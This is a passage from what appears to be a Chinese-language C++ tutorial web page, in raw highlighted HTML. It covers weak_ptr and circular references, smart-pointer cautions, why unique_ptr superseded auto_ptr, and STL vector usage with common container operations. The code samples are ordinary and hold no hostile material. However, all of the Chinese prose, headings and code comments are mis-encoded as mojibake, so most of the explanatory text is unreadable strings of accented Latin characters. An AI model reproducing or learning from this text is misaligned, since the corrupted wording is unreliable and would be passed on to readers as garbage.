class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pa use_count: &quot;</span> &lt;&lt; pa.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pb use_count: &quot;</span> &lt;&lt; pb.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å½“ pa å’Œ pb ç¦»å¼€ä½œç”¨åŸŸæ—¶ï¼Œå¼•ç”¨è®¡æ•°éƒ½èƒ½é™ä¸º 0ï¼Œå¯¹è±¡è¢«æ­£ç¡®é”€æ¯</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// è¾“å‡º NodeA_weak destroyed å’Œ NodeB_weak destroyed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-2-2-æœ‰å…³æ™ºèƒ½æŒ‡é’ˆçš„æ³¨æ„äº‹é¡¹"><a href="#16-2-2-æœ‰å…³æ™ºèƒ½æŒ‡é’ˆçš„æ³¨æ„äº‹é¡¹" class="headerlink" title="16.2.2 æœ‰å…³æ™ºèƒ½æŒ‡é’ˆçš„æ³¨æ„äº‹é¡¹"></a>16.2.2 æœ‰å…³æ™ºèƒ½æŒ‡é’ˆçš„æ³¨æ„äº‹é¡¹</h3><ul><li>  <strong>ä¸è¦æ··ç”¨æ™ºèƒ½æŒ‡é’ˆå’ŒåŸå§‹æŒ‡é’ˆ:</strong> é¿å…å°† <code>get()</code> è¿”å›çš„åŸå§‹æŒ‡é’ˆä¼ é€’ç»™å¦ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆæˆ–æ‰‹åŠ¨ <code>delete</code>ã€‚</li><li>  <strong>ä¼˜å…ˆä½¿ç”¨ <code>make_unique</code> å’Œ <code>make_shared</code>:</strong> æ›´å®‰å…¨ã€å¯èƒ½æ›´é«˜æ•ˆã€‚</li><li>  <strong><code>shared_ptr</code> çš„æ€§èƒ½å¼€é”€:</strong> å¼•ç”¨è®¡æ•°æ˜¯åŸå­æ“ä½œï¼Œåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹æœ‰ä¸€å®šå¼€é”€ã€‚<code>shared_ptr</code> å¯¹è±¡æœ¬èº«ä¹Ÿæ¯” <code>unique_ptr</code> æˆ–åŸå§‹æŒ‡é’ˆå¤§ï¼ˆéœ€è¦å­˜å‚¨æŒ‡å‘æ§åˆ¶å—çš„æŒ‡é’ˆï¼‰ã€‚</li><li>  <strong><code>this</code> æŒ‡é’ˆé—®é¢˜:</strong> ä¸è¦åœ¨ç±»çš„æ„é€ å‡½æ•°ä¸­å°† <code>this</code> æŒ‡é’ˆç›´æ¥ä¼ é€’ç»™ <code>shared_ptr</code> çš„æ„é€ å‡½æ•°ã€‚å¦‚æœéœ€è¦è®©ç±»è‡ªèº«èƒ½å¤Ÿåˆ›å»ºæŒ‡å‘è‡ªå·±çš„ <code>shared_ptr</code>ï¼Œåº”ç»§æ‰¿è‡ª <code>std::enable_shared_from_this&lt;YourClass&gt;</code> å¹¶ä½¿ç”¨ <code>shared_from_this()</code> æ–¹æ³•ã€‚</li></ul><h3 id="16-2-3-unique-ptr-ä¸ºä½•ä¼˜äº-auto-ptr"><a href="#16-2-3-unique-ptr-ä¸ºä½•ä¼˜äº-auto-ptr" class="headerlink" title="16.2.3 unique_ptr ä¸ºä½•ä¼˜äº auto_ptr"></a>16.2.3 <code>unique_ptr</code> ä¸ºä½•ä¼˜äº <code>auto_ptr</code></h3><p>C++98 å¼•å…¥äº† <code>std::auto_ptr</code>ï¼Œå®ƒæ˜¯ <code>unique_ptr</code> çš„å‰èº«ï¼Œä¹Ÿè¯•å›¾å®ç°ç‹¬å æ‰€æœ‰æƒã€‚ä½† <code>auto_ptr</code> æœ‰ä¸€ä¸ªä¸¥é‡çš„è®¾è®¡ç¼ºé™·ï¼šå®ƒçš„<strong>å¤åˆ¶æ„é€ å‡½æ•°</strong>å’Œ<strong>èµ‹å€¼è¿ç®—ç¬¦</strong>ä¼š<strong>è½¬ç§»æ‰€æœ‰æƒ</strong>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">auto_ptr</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ap1</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">10</span>))</span></span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">auto_ptr</span>&lt;<span class="keyword">int</span>&gt; ap2 = ap1; <span class="comment">// ï¼ï¼æ‰€æœ‰æƒä» ap1 è½¬ç§»åˆ° ap2ï¼Œap1 å˜ä¸ºæ— æ•ˆï¼ï¼</span></span><br></pre></td></tr></table></figure><p>è¿™ç§éšå¼çš„ã€ç ´åæ€§çš„å¤åˆ¶è¡Œä¸ºéå¸¸å±é™©ï¼Œå°¤å…¶æ˜¯åœ¨å°† <code>auto_ptr</code> æ”¾å…¥å®¹å™¨æˆ–ä½œä¸ºå‡½æ•°å‚æ•°æŒ‰å€¼ä¼ é€’æ—¶ï¼Œä¼šå¯¼è‡´æ„å¤–çš„æ‰€æœ‰æƒä¸¢å¤±ã€‚</p><p>C++11 å¼•å…¥äº†ç§»åŠ¨è¯­ä¹‰ï¼Œä½¿å¾— <code>unique_ptr</code> å¯ä»¥é€šè¿‡æ˜¾å¼çš„ <code>std::move</code> æ¥å®‰å…¨åœ°è½¬ç§»æ‰€æœ‰æƒï¼ŒåŒæ—¶<strong>ç¦æ­¢</strong>äº†å¤åˆ¶æ“ä½œï¼Œä»è€Œé¿å…äº† <code>auto_ptr</code> çš„é—®é¢˜ã€‚</p><p><strong><code>auto_ptr</code> å·²åœ¨ C++11 ä¸­è¢«åºŸå¼ƒï¼Œå¹¶åœ¨ C++17 ä¸­è¢«ç§»é™¤ã€‚åº”å§‹ç»ˆä½¿ç”¨ <code>unique_ptr</code> æ›¿ä»£å®ƒã€‚</strong></p><h3 id="16-2-4-é€‰æ‹©æ™ºèƒ½æŒ‡é’ˆ"><a href="#16-2-4-é€‰æ‹©æ™ºèƒ½æŒ‡é’ˆ" class="headerlink" title="16.2.4 é€‰æ‹©æ™ºèƒ½æŒ‡é’ˆ"></a>16.2.4 é€‰æ‹©æ™ºèƒ½æŒ‡é’ˆ</h3><ul><li>  <strong>é»˜è®¤é€‰æ‹© <code>std::unique_ptr</code>:</strong> å½“ä½ éœ€è¦ç®¡ç†ä¸€ä¸ªåŠ¨æ€åˆ†é…çš„èµ„æºï¼Œå¹¶ä¸”ä¸éœ€è¦å…±äº«å…¶æ‰€æœ‰æƒæ—¶ï¼Œ<code>unique_ptr</code> æ˜¯æœ€ç®€å•ã€æœ€é«˜æ•ˆçš„é€‰æ‹©ã€‚</li><li>  <strong>ä½¿ç”¨ <code>std::shared_ptr</code>:</strong> å½“èµ„æºéœ€è¦è¢«å¤šä¸ªæ‰€æœ‰è€…å…±äº«ç”Ÿå‘½å‘¨æœŸæ—¶ï¼ˆä¾‹å¦‚ï¼Œåœ¨æ•°æ®ç»“æ„ä¸­å¤šä¸ªéƒ¨åˆ†å¯èƒ½å¼•ç”¨åŒä¸€ä¸ªèŠ‚ç‚¹ï¼Œæˆ–è€…å›è°ƒå‡½æ•°éœ€è¦ç¡®ä¿æŸä¸ªå¯¹è±¡åœ¨å…¶æ‰§è¡ŒæœŸé—´å­˜æ´»ï¼‰ã€‚</li><li>  <strong>ä½¿ç”¨ <code>std::weak_ptr</code>:</strong> å½“ä½ éœ€è¦è§‚å¯Ÿä¸€ä¸ªç”± <code>shared_ptr</code> ç®¡ç†çš„å¯¹è±¡ï¼Œä½†ä¸æƒ³å½±å“å…¶ç”Ÿå‘½å‘¨æœŸæ—¶ï¼Œç‰¹åˆ«æ˜¯ä¸ºäº†æ‰“ç ´ <code>shared_ptr</code> ä¹‹é—´çš„å¾ªç¯å¼•ç”¨ã€‚</li></ul><p>æ™ºèƒ½æŒ‡é’ˆæ˜¯ç°ä»£ C++ ä¸­ç®¡ç†åŠ¨æ€èµ„æºçš„æ ¸å¿ƒå·¥å…·ï¼Œæå¤§åœ°æé«˜äº†ä»£ç çš„å®‰å…¨æ€§å’Œç®€æ´æ€§ã€‚</p><h2 id="16-3-æ ‡å‡†æ¨¡æ¿åº“ï¼ˆSTLï¼‰"><a href="#16-3-æ ‡å‡†æ¨¡æ¿åº“ï¼ˆSTLï¼‰" class="headerlink" title="16.3 æ ‡å‡†æ¨¡æ¿åº“ï¼ˆSTLï¼‰"></a>16.3 æ ‡å‡†æ¨¡æ¿åº“ï¼ˆSTLï¼‰</h2><p><strong>æ ‡å‡†æ¨¡æ¿åº“ (Standard Template Library, STL)</strong> æ˜¯ C++ æ ‡å‡†åº“çš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå®ƒæä¾›äº†ä¸€å¥—é€šç”¨çš„æ¨¡æ¿ç±»å’Œå‡½æ•°ï¼Œç”¨äºå®ç°å¸¸ç”¨çš„æ•°æ®ç»“æ„å’Œç®—æ³•ã€‚STL çš„æ ¸å¿ƒæ€æƒ³æ˜¯**æ³›å‹ç¼–ç¨‹ (Generic Programming)**ï¼Œå³ä»£ç ç‹¬ç«‹äºç‰¹å®šçš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥åº”ç”¨äºå¤šç§ç±»å‹ã€‚</p><p>STL ä¸»è¦ç”±ä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶æ„æˆï¼š</p><ol><li> <strong>å®¹å™¨ (Containers):</strong> ç”¨äºå­˜å‚¨æ•°æ®çš„æ¨¡æ¿ç±»ã€‚ä¾‹å¦‚ <code>vector</code>, <code>list</code>, <code>deque</code>, <code>set</code>, <code>map</code> ç­‰ã€‚å®ƒä»¬å°è£…äº†æ•°æ®ç»“æ„ï¼Œå¹¶æä¾›äº†ç®¡ç†å…ƒç´ çš„æ–¹æ³•ã€‚</li><li> <strong>ç®—æ³• (Algorithms):</strong> ç”¨äºå¤„ç†å®¹å™¨ä¸­æ•°æ®çš„æ¨¡æ¿å‡½æ•°ã€‚ä¾‹å¦‚ <code>sort</code>, <code>find</code>, <code>copy</code>, <code>for_each</code> ç­‰ã€‚è¿™äº›ç®—æ³•é€šå¸¸é€šè¿‡è¿­ä»£å™¨ä½œç”¨äºå®¹å™¨ä¸­çš„å…ƒç´ èŒƒå›´ã€‚</li><li> <strong>è¿­ä»£å™¨ (Iterators):</strong> è¡Œä¸ºç±»ä¼¼äºæŒ‡é’ˆçš„å¯¹è±¡ï¼Œç”¨äºéå†å®¹å™¨ä¸­çš„å…ƒç´ ï¼Œå¹¶ä½œä¸ºè¿æ¥å®¹å™¨å’Œç®—æ³•çš„æ¡¥æ¢ã€‚</li></ol><p>æœ¬èŠ‚å°†é‡ç‚¹ä»‹ç» STL ä¸­æœ€å¸¸ç”¨çš„å®¹å™¨ä¹‹ä¸€ï¼š<code>vector</code>ï¼Œä»¥åŠé€‚ç”¨äºå¤šç§å®¹å™¨çš„é€šç”¨æ“ä½œã€‚</p><h3 id="16-3-1-æ¨¡æ¿ç±»-vector"><a href="#16-3-1-æ¨¡æ¿ç±»-vector" class="headerlink" title="16.3.1 æ¨¡æ¿ç±» vector"></a>16.3.1 æ¨¡æ¿ç±» vector</h3><p><code>std::vector</code> æ˜¯ä¸€ä¸ªæ¨¡æ¿ç±»ï¼Œå®šä¹‰åœ¨ <code>&lt;vector&gt;</code> å¤´æ–‡ä»¶ä¸­ã€‚å®ƒå®ç°äº†ä¸€ä¸ª**åŠ¨æ€æ•°ç»„ (Dynamic Array)**ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è‡ªåŠ¨å¢é•¿æˆ–æ”¶ç¼©å¤§å°ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ul><li>  <strong>åŠ¨æ€å¤§å°:</strong> å¯ä»¥åœ¨è¿è¡Œæ—¶æ·»åŠ æˆ–åˆ é™¤å…ƒç´ ï¼Œ<code>vector</code> ä¼šè‡ªåŠ¨ç®¡ç†å†…å­˜ã€‚</li><li>  <strong>éšæœºè®¿é—®:</strong> æ”¯æŒé€šè¿‡ç´¢å¼• (<code>[]</code> æˆ– <code>at()</code>) å¿«é€Ÿè®¿é—®ä»»ä½•ä½ç½®çš„å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ã€‚</li><li>  <strong>è¿ç»­å­˜å‚¨:</strong> å…ƒç´ åœ¨å†…å­˜ä¸­æ˜¯è¿ç»­å­˜å‚¨çš„ï¼Œè¿™ä½¿å¾—é€šè¿‡æŒ‡é’ˆæˆ–è¿­ä»£å™¨è¿›è¡Œéå†éå¸¸é«˜æ•ˆï¼Œå¹¶èƒ½ä¸éœ€è¦è¿ç»­å†…å­˜çš„ C é£æ ¼ API å…¼å®¹ã€‚</li><li>  <strong>å°¾éƒ¨æ’å…¥/åˆ é™¤é«˜æ•ˆ:</strong> åœ¨æœ«å°¾æ·»åŠ  (<code>push_back</code>) æˆ–åˆ é™¤ (<code>pop_back</code>) å…ƒç´ é€šå¸¸å¾ˆé«˜æ•ˆï¼ˆæ‘Šé”€æ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼‰ã€‚</li><li>  <strong>ä¸­é—´æ’å…¥/åˆ é™¤ä½æ•ˆ:</strong> åœ¨ä¸­é—´æˆ–å¼€å¤´æ’å…¥æˆ–åˆ é™¤å…ƒç´ å¯èƒ½éœ€è¦ç§»åŠ¨åç»­æ‰€æœ‰å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(N)ã€‚</li></ul><p><strong>åŸºæœ¬ç”¨æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // åŒ…å« vector å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»º vector å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; scores; <span class="comment">// åˆ›å»ºä¸€ä¸ªç©ºçš„ int å‘é‡</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; <span class="title">lengths</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// åˆ›å»ºåŒ…å« 10 ä¸ª double å…ƒç´ çš„å‘é‡ï¼Œé»˜è®¤åˆå§‹åŒ–ä¸º 0.0</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">names</span><span class="params">(<span class="number">5</span>, <span class="string">&quot;Unknown&quot;</span>)</span></span>; <span class="comment">// åˆ›å»ºåŒ…å« 5 ä¸ª string å…ƒç´ ï¼Œéƒ½åˆå§‹åŒ–ä¸º &quot;Unknown&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ (C++11)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ·»åŠ å…ƒç´ åˆ°æœ«å°¾</span></span><br><span class="line">    scores.push_back(<span class="number">95</span>);</span><br><span class="line">    scores.push_back(<span class="number">88</span>);</span><br><span class="line">    scores.push_back(<span class="number">76</span>); <span class="comment">// scores ç°åœ¨æ˜¯ &#123;95, 88, 76&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å…ƒç´ </span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First score: &quot;</span> &lt;&lt; scores[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ []</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second score: &quot;</span> &lt;&lt; scores.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ at() (å¸¦è¾¹ç•Œæ£€æŸ¥)</span></span><br><span class="line">    scores[<span class="number">0</span>] = <span class="number">98</span>; <span class="comment">// ä¿®æ”¹å…ƒç´ </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¤§å°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of scores: &quot;</span> &lt;&lt; scores.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of names: &quot;</span> &lt;&lt; names.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// è¾“å‡º 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-3-2-å¯å¯¹å®¹å™¨æ‰§è¡Œçš„æ“ä½œ"><a href="#16-3-2-å¯å¯¹å®¹å™¨æ‰§è¡Œçš„æ“ä½œ" class="headerlink" title="16.3.2 å¯å¯¹å®¹å™¨æ‰§è¡Œçš„æ“ä½œ"></a>16.3.2 å¯å¯¹å®¹å™¨æ‰§è¡Œçš„æ“ä½œ</h3><p>è®¸å¤š STL å®¹å™¨ï¼ˆåŒ…æ‹¬ <code>vector</code>ï¼‰éƒ½æ”¯æŒä¸€ç»„å¸¸è§çš„æ“ä½œï¼š</p><ul><li>  <strong><code>size()</code>:</strong> è¿”å›å®¹å™¨ä¸­å…ƒç´ çš„æ•°é‡ã€‚ç±»å‹é€šå¸¸æ˜¯ <code>size_type</code> (ä¸€ç§æ— ç¬¦å·æ•´å‹)ã€‚</li><li>  <strong><code>empty()</code>:</strong> æ£€æŸ¥å®¹å™¨æ˜¯å¦ä¸ºç©ºã€‚å¦‚æœ <code>size() == 0</code>ï¼Œè¿”å› <code>true</code>ï¼Œå¦åˆ™è¿”å› <code>false</code>ã€‚</li><li>  <strong><code>operator[]</code>:</strong> é€šè¿‡ç´¢å¼•è®¿é—®å…ƒç´ ï¼ˆä»…é€‚ç”¨äº <code>vector</code>, <code>deque</code>, <code>string</code>, <code>array</code>ï¼‰ã€‚<strong>ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥</strong>ã€‚</li><li>  <strong><code>at()</code>:</strong> é€šè¿‡ç´¢å¼•è®¿é—®å…ƒç´ ï¼ˆä»…é€‚ç”¨äº <code>vector</code>, <code>deque</code>, <code>string</code>, <code>array</code>ï¼‰ã€‚<strong>è¿›è¡Œè¾¹ç•Œæ£€æŸ¥</strong>ï¼Œè¶Šç•Œæ—¶æŠ›å‡º <code>std::out_of_range</code> å¼‚å¸¸ã€‚</li><li>  <strong><code>front()</code>:</strong> è¿”å›å¯¹ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚å®¹å™¨ä¸èƒ½ä¸ºç©ºã€‚</li><li>  <strong><code>back()</code>:</strong> è¿”å›å¯¹æœ€åä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ã€‚å®¹å™¨ä¸èƒ½ä¸ºç©ºã€‚</li><li>  <strong><code>push_back(value)</code>:</strong> (ä»…é€‚ç”¨äº <code>vector</code>, <code>deque</code>, <code>list</code>, <code>string</code>) åœ¨å®¹å™¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå€¼ä¸º <code>value</code> çš„å…ƒç´ ã€‚</li><li>  <strong><code>pop_back()</code>:</strong> (ä»…é€‚ç”¨äº <code>vector</code>, <code>deque</code>, <code>list</code>, <code>string</code>) åˆ é™¤å®¹å™¨æœ«å°¾çš„å…ƒç´ ã€‚å®¹å™¨ä¸èƒ½ä¸ºç©ºã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // for out_of_range</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!data.empty()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size: &quot;</span> &lt;&lt; data.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Front: &quot;</span> &lt;&lt; data.front() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back: &quot;</span> &lt;&lt; data.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// è¾“å‡º 3</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Element at index 1: &quot;</span> &lt;&lt; data[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data.push_back(<span class="number">4</span>); <span class="comment">// data: &#123;1, 2, 3, 4&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After push_back(4), back is: &quot;</span> &lt;&lt; data.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 4</span></span><br><span class="line"></span><br><span class="line">    data.pop_back(); <span class="comment">// data: &#123;1, 2, 3&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After pop_back(), back is: &quot;</span> &lt;&lt; data.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        data.at(<span class="number">1</span>) = <span class="number">20</span>; <span class="comment">// ä¿®æ”¹ç¬¬äºŒä¸ªå…ƒç´ </span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Element at index 1 (using at): &quot;</span> &lt;&lt; data.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 20</span></span><br><span class="line">        <span class="keyword">int</span> val = data.at(<span class="number">5</span>); <span class="comment">// è®¿é—®è¶Šç•Œï¼Œå°†æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::out_of_range&amp; oor) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: &quot;</span> &lt;&lt; oor.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-3-3-å¯¹å®¹å™¨å¯æ‰§è¡Œçš„å…¶ä»–æ“ä½œ"><a href="#16-3-3-å¯¹å®¹å™¨å¯æ‰§è¡Œçš„å…¶ä»–æ“ä½œ" class="headerlink" title="16.3.3 å¯¹å®¹å™¨å¯æ‰§è¡Œçš„å…¶ä»–æ“ä½œ"></a>16.3.3 å¯¹å®¹å™¨å¯æ‰§è¡Œçš„å…¶ä»–æ“ä½œ</h3><p>é™¤äº†åŸºæœ¬æ“ä½œï¼ŒSTL å®¹å™¨è¿˜æä¾›äº†å…¶ä»–ä¸€äº›æœ‰ç”¨çš„æ–¹æ³•ï¼Œå…¶ä¸­è®¸å¤šæ¶‰åŠåˆ°**è¿­ä»£å™¨ (Iterators)**ã€‚è¿­ä»£å™¨æ˜¯æ³›åŒ–çš„æŒ‡é’ˆï¼Œç”¨äºæŒ‡å®šå®¹å™¨ä¸­çš„ä½ç½®æˆ–èŒƒå›´ã€‚</p><ul><li><p><strong>è¿­ä»£å™¨è·å–:</strong></p><ul><li>  <code>begin()</code>: è¿”å›æŒ‡å‘å®¹å™¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„è¿­ä»£å™¨ã€‚</li><li>  <code>end()</code>: è¿”å›æŒ‡å‘å®¹å™¨<strong>æœ«å°¾ä¹‹å (past-the-end)</strong> ä½ç½®çš„è¿­ä»£å™¨ã€‚å®ƒä¸æŒ‡å‘ä»»ä½•æœ‰æ•ˆå…ƒç´ ï¼Œå¸¸ç”¨äºæ ‡è®°èŒƒå›´çš„ç»“æŸã€‚</li><li>  <code>rbegin()</code>, <code>rend()</code>: è¿”å›åå‘è¿­ä»£å™¨ï¼Œç”¨äºä»åå‘å‰éå†ã€‚</li><li>  <code>cbegin()</code>, <code>cend()</code>, <code>crbegin()</code>, <code>crend()</code> (C++11): è¿”å› <code>const</code> è¿­ä»£å™¨ï¼Œç”¨äºåªè¯»è®¿é—®ã€‚</li></ul></li><li><p><strong>æ’å…¥ (<code>insert()</code>):</strong> åœ¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ ã€‚éœ€è¦ä¸€ä¸ªæŒ‡å‘æ’å…¥ä½ç½®çš„è¿­ä»£å™¨ã€‚</p><ul><li>  <code>insert(iterator pos, const value_type&amp; val)</code>: åœ¨ <code>pos</code> ä¹‹å‰æ’å…¥ <code>val</code>ã€‚è¿”å›æŒ‡å‘æ–°æ’å…¥å…ƒç´ çš„è¿­ä»£å™¨ã€‚</li><li>  <code>insert(iterator pos, size_type n, const value_type&amp; val)</code>: åœ¨ <code>pos</code> ä¹‹å‰æ’å…¥ <code>n</code> ä¸ª <code>val</code>ã€‚</li><li>  <code>insert(iterator pos, InputIt first, InputIt last)</code>: åœ¨ <code>pos</code> ä¹‹å‰æ’å…¥æ¥è‡ªè¿­ä»£å™¨èŒƒå›´ <code>[first, last)</code> çš„å…ƒç´ ã€‚</li></ul></li><li><p><strong>åˆ é™¤ (<code>erase()</code>):</strong> åˆ é™¤æŒ‡å®šä½ç½®æˆ–èŒƒå›´çš„å…ƒç´ ã€‚éœ€è¦è¿­ä»£å™¨ã€‚</p><ul><li>  